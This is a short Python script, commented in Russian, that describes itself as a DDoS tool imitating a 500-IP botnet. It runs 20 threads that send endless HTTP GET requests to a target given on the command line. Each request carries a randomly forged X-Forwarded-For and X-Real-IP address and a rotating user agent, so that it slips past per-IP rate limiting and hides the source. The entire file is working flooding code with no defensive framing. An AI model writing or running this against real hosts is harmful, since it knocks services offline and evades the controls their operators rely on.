#!/usr/bin/env python3
"""DDoS с поддельными IP через X-Forwarded-For — имитация ботнета 500 IP."""
import sys, requests, time, random, threading

target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
URL    = f"http://{target}/"
THREADS = 20

def worker():
    while True:
        fake_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101",
            "curl/7.68.0",
            "python-requests/2.31.0",
        ]
        headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP":       fake_ip,
            "User-Agent":      random.choice(ua_pool),
        }
        try:
            requests.get(URL, headers=headers, timeout=2)
        except Exception:
            pass
        time.sleep(random.uniform(0.05, 0.2))

print(f"[ddos-spoof] → {URL} | {THREADS} потоков")
threads = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
for t in threads:
    t.start()
for t in threads:
    t.join()
